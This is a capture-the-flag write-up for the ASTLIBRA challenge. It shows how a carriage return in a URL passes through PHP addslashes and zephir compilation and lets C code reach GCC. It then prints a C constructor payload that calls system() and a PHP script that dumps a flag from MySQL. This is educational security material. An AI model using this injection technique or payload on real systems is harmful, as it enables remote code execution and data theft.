# ASTLIBRA

We can provide a URL that is escaped using PHP's `addslashes` function and then inserted into this template:
```
namespace {namespace};

class {class}{
    public function getURL(){
        return "{base64url}";
    }
    public function test(){
        var ch = curl_init();
        curl_setopt(ch, CURLOPT_URL, "{url}");
        curl_setopt(ch, CURLOPT_HEADER, 0);
        curl_exec(ch);
        curl_close(ch);
        return true;
    }
}
```

This code is then compiled by zephir (a PHP-like language that gets compiled to C).

By tinkering around, we noticed that zephir will escape new lines as `\n` when generating the C string for the URL. Carriage returns, on the other hand, are left unchanged. This then leads to GCC failing to compile the code as it treats carriage returns as new lines. Using some preprocessor magic, this allows us to inject (almost) arbirary C code.
> Whenever backslash appears at the end of a line (immediately followed by the newline character), both backslash and newline are deleted [...].
If we set the URL to `http\<CR>");<our injected code>//` (there is a check that the URL starts with `http`), `addslashes` will escape it as `http\\<CR>\");<our injected code>//`. Zephir will then generate the following line of C code from this `ZVAL_STRING(&_1, "http\\<CR>\");<our injected code>//");` and finally the preprocessor will transform this into `ZVAL_STRING(&_1, "http\\");<our injected code>//");` which will then compile our C code.

Since the flag was in a MySQL database in a different docker and the server had a `config.php` that already connected to the database, we used a payload that used `system` to run the following PHP code when the zephir module was loaded (to bypass a bunch of checks that would run after the module was loaded but before `test()` is called).
```
<?php
require_once("/var/www/html/config.php");

$stmt = $dbc->prepare("SELECT flag FROM flag;");
$stmt->execute();
$result = $stmt->get_result();
$row = $result->fetch_assoc();
echo $row["flag"];
```
```
__attribute__((constructor)) void a() {
    char a[] = {<CMD>};
    system(a);
    exit(0);
};
```

## note
The intended solution was to use a bug in the templating code that would convert `\\` into `\` in the URL to get code injection in zephir (instead of C). This actually almost breaks our exploit since it removes the second backslash before the carriage return. However, we didn't notice at the time since, during codegen, zephir will properly escape the orphaned backslash.